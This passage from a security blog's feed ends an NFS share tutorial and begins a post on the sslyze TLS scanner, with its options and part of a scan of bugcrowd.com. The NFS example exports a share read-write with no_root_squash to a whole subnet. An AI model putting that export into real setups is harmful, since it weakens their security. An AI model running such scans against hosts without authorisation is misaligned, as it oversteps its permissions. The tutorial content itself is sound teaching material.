</pre></td><td class='code'><pre><code class=''><span class='line'>/sharepath client(options)</span></code></pre></td></tr></table></div></figure>


<p>You can specify the client by hostname, domain name, IP address or network range. In this example, I will allow all hosts on my local subnet to have read write access to the share, and permit root users to retain their privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/var/nfs-share 192.168.217.0/24(rw,no_root_squash)</span></code></pre></td></tr></table></div></figure>


<p>Now restart the server for the configuration to take effect: <code>systemctl restart nfs</code>. You can see NFS statistics with <strong>nfstat</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfsstat
</span><span class='line'>Server rpc stats:
</span><span class='line'>calls      badcalls   badclnt    badauth    xdrcall
</span><span class='line'>91         0          0          0          0       
</span><span class='line'>
</span><span class='line'>Server nfs v4:
</span><span class='line'>null         compound     
</span><span class='line'>2         2% 89       97% 
</span><span class='line'>
</span><span class='line'>Server nfs v4 operations:
</span><span class='line'>op0-unused   op1-unused   op2-future   access       close        commit       
</span><span class='line'>0         0% 0         0% 0         0% 7         2% 1         0% 0         0% 
</span><span class='line'>create       delegpurge   delegreturn  getattr      getfh        link         
</span><span class='line'>0         0% 0         0% 1         0% 52       20% 8         3% 0         0% 
</span><span class='line'>lock         lockt        locku        lookup       lookup_root  nverify      
</span><span class='line'>0         0% 0         0% 0         0% 16        6% 0         0% 0         0% 
</span><span class='line'>open         openattr     open_conf    open_dgrd    putfh        putpubfh     
</span><span class='line'>1         0% 0         0% 0         0% 0         0% 63       25% 0         0% 
</span><span class='line'>putrootfh    read         readdir      readlink     remove       rename       
</span><span class='line'>4         1% 1         0% 2         0% 0         0% 0         0% 0         0% 
</span><span class='line'>renew        restorefh    savefh       secinfo      setattr      setcltid     
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 0         0% 0         0% 
</span><span class='line'>setcltidconf verify       write        rellockowner bc_ctl       bind_conn    
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 0         0% 0         0% 
</span><span class='line'>exchange_id  create_ses   destroy_ses  free_stateid getdirdeleg  getdevinfo   
</span><span class='line'>2         0% 2         0% 1         0% 0         0% 0         0% 0         0% 
</span><span class='line'>getdevlist   layoutcommit layoutget    layoutreturn secinfononam sequence     
</span><span class='line'>0         0% 0         0% 0         0% 0         0% 2         0% 83       33% 
</span><span class='line'>set_ssv      test_stateid want_deleg   destroy_clid reclaim_comp 
</span><span class='line'>0         0% 0         0% 0         0% 1         0% 2         0% </span></code></pre></td></tr></table></div></figure>


<p>To see the available exports and their options, use <strong>exportfs</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exportfs -v
</span><span class='line'>/var/nfs-share    192.168.217.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)</span></code></pre></td></tr></table></div></figure>


<h3>Client configuration</h3>

<p>On the client, I first made a directory for the shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>To mount the share, the command looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t nfs -o options server:/export /mount/directory</span></code></pre></td></tr></table></div></figure>


<p>In my case, I mounted the exported share with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t nfs 192.168.217.131:/var/nfs-share /mnt/nfs/</span></code></pre></td></tr></table></div></figure>


<p>Then I went to the directory and read the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/nfs# ls
</span><span class='line'>file.txt
</span><span class='line'>root@kali:/mnt/nfs# cat file.txt 
</span><span class='line'>something here</span></code></pre></td></tr></table></div></figure>


<p>When done, unmount the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>If instead of manually mounting the share, we would want it automatically mounted at boot, we&rsquo;d have to edit <code>/etc/fstab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># /etc/fstab: static file system information.
</span><span class='line'>#
</span><span class='line'># Use 'blkid' to print the universally unique identifier for a
</span><span class='line'># device; this may be used with UUID= as a more robust way to name devices
</span><span class='line'># that works even if disks are added and removed. See fstab(5).
</span><span class='line'>#
</span><span class='line'># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
</span><span class='line'>192.168.217.131:/var/nfs-share /mnt/nfs nfs rw 0 0</span></code></pre></td></tr></table></div></figure>


<p>Now reboot the client and check that the share was mounted:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount | grep nfs
</span><span class='line'>192.168.217.131:/var/nfs-share on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=262144,wsize=262144,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=0.0.0.0,local_lock=none,addr=192.168.217.131)</span></code></pre></td></tr></table></div></figure>


<p>So, it&rsquo;s pretty easy and fast to set up NFS shares, but keep in mind this tutorial only scratched the surface of the available configuration options.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Q: What's tiny and yellow and very,   \
</span><span class='line'>| very, dangerous? A: A canary with the |
</span><span class='line'>\ super-user password.                  /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslyze - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools/"/>
    <updated>2017-07-16T04:57:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: test the SSL/TLS security posture of a target as a standalone tool or as a custom made solution. sslyze is a fast and powerful SSL/TLS scanning Python tool that can be used both from the command line or as a library to include in your own scripts. It&rsquo;s being updated frequently and it&rsquo;s been tested on Windows, Linux and MacOS platforms.</p>

<p>Homepage: <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a></p>

<!-- more -->


<h2>sslyze description</h2>

<blockquote><p>SSLyze is a Python library and a CLI tool that can analyze the SSL configuration of a server by connecting to it. It
is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations
affecting their SSL/TLS servers.</p>

<p>Key features include:</p>

<ul>
<li><p>Python API, in order to run scans and process the results directly from Python.</p></li>
<li><p>Scans are automatically dispatched among multiple processes, making them very fast.</p></li>
<li><p>Performance testing: session resumption and TLS tickets support.</p></li>
<li><p>Security testing: weak cipher suites, insecure renegotiation, CRIME, Heartbleed and more.</p></li>
<li><p>Server certificate validation and revocation checking through OCSP stapling.</p></li>
<li><p>Support for StartTLS handshakes on SMTP, XMPP, LDAP, POP, IMAP, RDP, PostGres and FTP.</p></li>
<li><p>Support for client certificates when scanning servers that perform mutual authentication.</p></li>
<li><p>Scan results can be written to an XML or JSON file for further processing.</p></li>
<li><p>And much more!</p></li>
</ul>


<p>SSLyze is all Python code but it uses an OpenSSL wrapper written in C called nassl, which was specifically developed
for allowing SSLyze to access the low-level OpenSSL APIs needed to perform deep SSL testing.</p></blockquote>

<p>Documentation: <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a></p>

<h2>sslyze options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: sslyze.py [options] target1.com target2.com:443 etc...
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --version             show program's version number and exit
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  --xml_out=XML_FILE    Writes the scan results as an XML document to the file
</span><span class='line'>                        XML_FILE. If XML_FILE is set to "-", the XML output
</span><span class='line'>                        will instead be printed to stdout.
</span><span class='line'>  --targets_in=TARGETS_IN
</span><span class='line'>                        Reads the list of targets to scan from the file
</span><span class='line'>                        TARGETS_IN. It should contain one host:port per line.
</span><span class='line'>  --timeout=TIMEOUT     Sets the timeout value in seconds used for every
</span><span class='line'>                        socket connection made to the target server(s).
</span><span class='line'>                        Default is 5s.
</span><span class='line'>  --nb_retries=NB_RETRIES
</span><span class='line'>                        Sets the number retry attempts for all network
</span><span class='line'>                        connections initiated throughout the scan. Increase
</span><span class='line'>                        this value if you are getting a lot of
</span><span class='line'>                        timeout/connection errors when scanning a specific
</span><span class='line'>                        server. Decrease this value to increase the speed of
</span><span class='line'>                        the scans; results may however return connection
</span><span class='line'>                        errors. Default is 4 connection attempts.
</span><span class='line'>  --https_tunnel=HTTPS_TUNNEL
</span><span class='line'>                        Tunnels all traffic to the target server(s) through an
</span><span class='line'>                        HTTP CONNECT proxy. HTTP_TUNNEL should be the proxy's
</span><span class='line'>                        URL: 'http://USER:PW@HOST:PORT/'. For proxies
</span><span class='line'>                        requiring authentication, only Basic Authentication is
</span><span class='line'>                        supported.
</span><span class='line'>  --starttls=STARTTLS   Performs StartTLS handshakes when connecting to the
</span><span class='line'>                        target server(s). STARTTLS should be one of: ['smtp',
</span><span class='line'>                        'xmpp', 'xmpp_server', 'pop3', 'ftp', 'imap', 'ldap',
</span><span class='line'>                        'rdp', 'postgres', 'auto']. The 'auto' option will
</span><span class='line'>                        cause SSLyze to deduce the protocol (ftp, imap, etc.)
</span><span class='line'>                        from the supplied port number, for each target
</span><span class='line'>                        servers.
</span><span class='line'>  --xmpp_to=XMPP_TO     Optional setting for STARTTLS XMPP.  XMPP_TO should be
</span><span class='line'>                        the hostname to be put in the 'to' attribute of the
</span><span class='line'>                        XMPP stream. Default is the server's hostname.
</span><span class='line'>  --sni=SNI             Use Server Name Indication to specify the hostname to
</span><span class='line'>                        connect to. Will only affect TLS 1.0+ connections.
</span><span class='line'>  --quiet               Hide script standard outputs. Will only affect script
</span><span class='line'>                        output if --xml_out is set.
</span><span class='line'>  --regular             Regular HTTPS scan; shortcut for --sslv2 --sslv3
</span><span class='line'>                        --tlsv1 --tlsv1_1 --tlsv1_2 --reneg --resum
</span><span class='line'>                        --certinfo=basic --http_get --hide_rejected_ciphers
</span><span class='line'>                        --compression --heartbleed
</span><span class='line'>
</span><span class='line'>  Client certificate support:
</span><span class='line'>    --cert=CERT         Client certificate chain filename. The certificates
</span><span class='line'>                        must be in PEM format and must be sorted starting with
</span><span class='line'>                        the subject's client certificate, followed by
</span><span class='line'>                        intermediate CA certificates if applicable.
</span><span class='line'>    --key=KEY           Client private key filename.
</span><span class='line'>    --keyform=KEYFORM   Client private key format. DER or PEM (default).
</span><span class='line'>    --pass=KEYPASS      Client private key passphrase.
</span><span class='line'>
</span><span class='line'>  PluginOpenSSLCipherSuites:
</span><span class='line'>    Scans the server(s) for supported OpenSSL cipher suites.
</span><span class='line'>
</span><span class='line'>    --sslv2             Lists the SSL 2.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --sslv3             Lists the SSL 3.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1             Lists the TLS 1.0 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1_1           Lists the TLS 1.1 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --tlsv1_2           Lists the TLS 1.2 OpenSSL cipher suites supported by
</span><span class='line'>                        the server(s).
</span><span class='line'>    --http_get          Option - For each cipher suite, sends an HTTP GET
</span><span class='line'>                        request after completing the SSL handshake and returns
</span><span class='line'>                        the HTTP status code.
</span><span class='line'>    --hide_rejected_ciphers
</span><span class='line'>                        Option - Hides the (usually long) list of cipher
</span><span class='line'>                        suites that were rejected by the server(s).
</span><span class='line'>
</span><span class='line'>  PluginChromeSha1Deprecation:
</span><span class='line'>    --chrome_sha1       Determines if the server will be affected by Google
</span><span class='line'>                        Chrome's SHA-1 deprecation plans. See
</span><span class='line'>                        http://googleonlinesecurity.blogspot.com/2014/09
</span><span class='line'>                        /gradually-sunsetting-sha-1.html for more information
</span><span class='line'>
</span><span class='line'>  PluginSessionRenegotiation:
</span><span class='line'>    --reneg             Tests the server(s) for client-initiated renegotiation
</span><span class='line'>                        and secure renegotiation support.
</span><span class='line'>
</span><span class='line'>  PluginHeartbleed:
</span><span class='line'>    --heartbleed        Tests the server(s) for the OpenSSL Heartbleed
</span><span class='line'>                        vulnerability (experimental).
</span><span class='line'>
</span><span class='line'>  PluginCertInfo:
</span><span class='line'>    --certinfo=CERTINFO
</span><span class='line'>                        Verifies the validity of the server(s) certificate(s)
</span><span class='line'>                        against various trust stores, checks for support for
</span><span class='line'>                        OCSP stapling, and prints relevant fields of the
</span><span class='line'>                        certificate. CERTINFO should be 'basic' or 'full'.
</span><span class='line'>    --ca_file=CA_FILE   Local Certificate Authority file (in PEM format), to
</span><span class='line'>                        verify the validity of the server(s) certificate(s)
</span><span class='line'>                        against.
</span><span class='line'>
</span><span class='line'>  PluginCompression:
</span><span class='line'>    --compression       Tests the server(s) for Zlib compression support.
</span><span class='line'>
</span><span class='line'>  PluginHSTS:
</span><span class='line'>    --hsts              Checks support for HTTP Strict Transport Security
</span><span class='line'>                        (HSTS) by collecting any Strict-Transport-Security
</span><span class='line'>                        field present in the HTTP response sent back by the
</span><span class='line'>                        server(s).
</span><span class='line'>
</span><span class='line'>  PluginSessionResumption:
</span><span class='line'>    Analyzes the target server's SSL session resumption capabilities.
</span><span class='line'>
</span><span class='line'>    --resum             Tests the server(s) for session resumption support
</span><span class='line'>                        using session IDs and TLS session tickets (RFC 5077).
</span><span class='line'>    --resum_rate        Performs 100 session resumptions with the server(s),
</span><span class='line'>                        in order to estimate the session resumption rate.</span></code></pre></td></tr></table></div></figure>


<h2>sslyze usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sslyze --regular bugcrowd.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> AVAILABLE PLUGINS
</span><span class='line'> -----------------
</span><span class='line'>
</span><span class='line'>  PluginSessionResumption
</span><span class='line'>  PluginCompression
</span><span class='line'>  PluginSessionRenegotiation
</span><span class='line'>  PluginChromeSha1Deprecation
</span><span class='line'>  PluginHSTS
</span><span class='line'>  PluginHeartbleed
</span><span class='line'>  PluginOpenSSLCipherSuites
</span><span class='line'>  PluginCertInfo
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> CHECKING HOST(S) AVAILABILITY
</span><span class='line'> -----------------------------
</span><span class='line'>
</span><span class='line'>   bugcrowd.com:443                    =&gt; 104.20.4.239:443
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> SCAN RESULTS FOR BUGCROWD.COM:443 - 104.20.4.239:443
</span><span class='line'> ----------------------------------------------------
</span><span class='line'>
</span><span class='line'>  * Deflate Compression:
</span><span class='line'>      OK - Compression disabled          
</span><span class='line'>
</span><span class='line'>  * Session Renegotiation:
</span><span class='line'>      Client-initiated Renegotiations:   OK - Rejected
</span><span class='line'>      Secure Renegotiation:              OK - Supported
</span><span class='line'>
</span><span class='line'>  * OpenSSL Heartbleed:
</span><span class='line'>      OK - Not vulnerable to Heartbleed  
</span><span class='line'>
</span><span class='line'>  * Session Resumption:
</span><span class='line'>      With Session IDs:                  OK - Supported (5 successful, 0 failed, 0 errors, 5 total attempts).
</span><span class='line'>      With TLS Session Tickets:          OK - Supported
</span><span class='line'>
</span><span class='line'>  * SSLV2 Cipher Suites:
</span><span class='line'>      Server rejected all cipher suites.
</span><span class='line'>
</span><span class='line'>  * Certificate - Content:
</span><span class='line'>      SHA1 Fingerprint:                  db65dbb15a1819ad4692c47cfc0bc966beb6e44f
</span><span class='line'>      Common Name:                       bugcrowd.com
</span><span class='line'>      Issuer:                            DigiCert SHA2 Extended Validation Server CA
</span><span class='line'>      Serial Number:                     075FE475034104F4909DDD4B5CD8C1AC
</span><span class='line'>      Not Before:                        Oct 10 00:00:00 2015 GMT
</span><span class='line'>      Not After:                         Oct 13 12:00:00 2017 GMT
</span><span class='line'>      Signature Algorithm:               sha256WithRSAEncryption
</span><span class='line'>      Public Key Algorithm:              rsaEncryption
</span><span class='line'>      Key Size:                          2048 bit
</span><span class='line'>      Exponent:                          65537 (0x10001)
</span><span class='line'>      X509v3 Subject Alternative Name:   {'DNS': ['bugcrowd.com', 'forum.bugcrowd.com', 'blog.bugcrowd.com', 'docs.bugcrowd.com', 'tracker.bugcrowd.com']}
</span><span class='line'>
</span><span class='line'>  * Certificate - Trust:
</span><span class='line'>      Hostname Validation:               OK - Subject Alternative Name matches
</span><span class='line'>      Google CA Store (09/2015):         OK - Certificate is trusted
</span><span class='line'>      Java 6 CA Store (Update 65):       OK - Certificate is trusted
</span><span class='line'>      Microsoft CA Store (09/2015):      OK - Certificate is trusted
</span><span class='line'>      Mozilla NSS CA Store (09/2015):    OK - Certificate is trusted
</span><span class='line'>      Apple CA Store (OS X 10.10.5):     OK - Certificate is trusted
</span><span class='line'>      Certificate Chain Received:        ['bugcrowd.com', 'DigiCert SHA2 Extended Validation Server CA']
</span><span class='line'>
</span><span class='line'>  * Certificate - OCSP Stapling:
</span><span class='line'>      OCSP Response Status:              successful
</span><span class='line'>      Validation w/ Mozilla's CA Store:  OK - Response is trusted
</span><span class='line'>      Responder Id:                      3DD350A5D6A0ADEEF34A600A65D321D4F8F8D60F
</span><span class='line'>      Cert Status:                       good
</span><span class='line'>      Cert Serial Number:                075FE475034104F4909DDD4B5CD8C1AC
</span><span class='line'>      This Update:                       Jul 12 12:10:00 2017 GMT
</span><span class='line'>      Next Update:                       Jul 19 11:25:00 2017 GMT
</span><span class='line'>
</span><span class='line'>  * TLSV1_2 Cipher Suites:
</span><span class='line'>      Preferred:                       
</span><span class='line'>                 ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA384       ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES256-GCM-SHA384   ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA256                 -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-GCM-SHA384             -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA256       ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA256                 -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-GCM-SHA256             -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * TLSV1_1 Cipher Suites:
</span><span class='line'>      Preferred:                       
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * TLSV1 Cipher Suites:
</span><span class='line'>      Preferred:                       
